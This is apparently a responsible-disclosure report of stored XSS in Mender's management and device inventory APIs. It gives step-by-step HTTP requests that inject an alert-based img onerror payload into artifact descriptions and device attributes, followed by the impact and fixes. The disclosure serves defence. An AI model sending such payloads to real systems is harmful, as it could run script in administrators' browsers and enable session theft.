# Stored XSS via API (Artifact Description + Device Inventory)

**Weakness:** Cross-site Scripting (XSS) - Stored (CWE-79)
**Asset:** staging.hosted.mender.io
**Severity:** Medium

## Summary
The Mender backend stores and returns unsanitized HTML/JavaScript payloads in two locations:
1. **Artifact Description** (`PUT /api/management/v1/deployments/artifacts/{id}`)
2. **Device Inventory Attributes** (`PATCH /api/devices/v1/inventory/device/attributes`)

While the official Mender UI (React) escapes these fields, the backend API returns raw HTML. This creates a Stored XSS vulnerability for any third-party dashboard, internal tool, or API consumer that renders these fields.

## Vulnerability Details

### 1. Artifact Description
**Endpoint:** `PUT /api/management/v1/deployments/artifacts/{id}`
**Parameter:** `description`

The API accepts arbitrary HTML strings and returns them unescaped in JSON responses.

### 2. Device Inventory (Higher Impact)
**Endpoint:** `PATCH /api/devices/v1/inventory/device/attributes`
**Parameter:** `value` (inside attributes array)

A compromised device can update its own inventory attributes with XSS payloads. These are then stored and served to administrators via the Management API (`GET /api/management/v1/inventory/devices`).

## Steps to Reproduce

### Prerequisites
- Access to staging.hosted.mender.io
- Authentication token (Management API)
- (Optional) Device authentication token

### Vector 1: Artifact Description

1. **Authenticate** and get a valid token.
2. **Identify an artifact ID** via `GET /api/management/v1/deployments/artifacts`.
3. **Send PUT request** with XSS payload:
   ```http
   PUT /api/management/v1/deployments/artifacts/<ARTIFACT_ID> HTTP/1.1
   Host: staging.hosted.mender.io
   Authorization: Bearer <TOKEN>
   Content-Type: application/json

   {
     "description": "<img src=x onerror=alert(document.domain)>"
   }
   ```
4. **Verify** by fetching the artifact. The response contains raw HTML:
   ```json
   {
     "description": "<img src=x onerror=alert(document.domain)>"
   }
   ```

### Vector 2: Device Inventory

1. **Authenticate as a device** (or use a device token).
2. **Inject payload** via Device API:
   ```http
   PATCH /api/devices/v1/inventory/device/attributes HTTP/1.1
   Authorization: Bearer <DEVICE_TOKEN>
   Content-Type: application/json

   [
     {
       "name": "kernel_version",
       "value": "<img src=x onerror=alert(document.domain)>"
     }
   ]
   ```
3. **As Admin**, fetch device list:
   ```http
   GET /api/management/v1/inventory/devices HTTP/1.1
   Authorization: Bearer <ADMIN_TOKEN>
   ```
4. **Response** contains unescaped payload:
   ```json
   {
     "name": "kernel_version",
     "value": "<img src=x onerror=alert(document.domain)>"
   }
   ```

## Impact
- **Admin Compromise:** An attacker (e.g., via a compromised IoT device) can inject malicious scripts that execute in the browser of an administrator viewing a vulnerable custom dashboard.
- **Session Hijacking:** Scripts can steal session tokens or perform actions on behalf of the victim.
- **Third-party Risk:** Customers building their own fleet management UIs on top of Mender API are vulnerable by default.

## Recommendations
1. **Input Validation:** Reject HTML tags in description and inventory fields server-side.
2. **Output Encoding:** Ensure the API does not return raw HTML, or serves it with appropriate content-type headers to prevent rendering.
3. **Documentation:** Explicitly warn API consumers to sanitize user-generated content.

## Attached Files
- `ATTACK_RESULTS.txt`: Logs from XSS verification against staging.
- `XSS_VERIFICATION_LOGS.txt`: HTTP request/response logs.
- `vulnerable_dashboard.html`: Proof of Concept HTML dashboard demonstrating execution.
- `xss_attack_simulator.js`: Node.js script to reproduce the finding.
- `REPRODUCE_XSS.sh`: Bash script for reproduction.
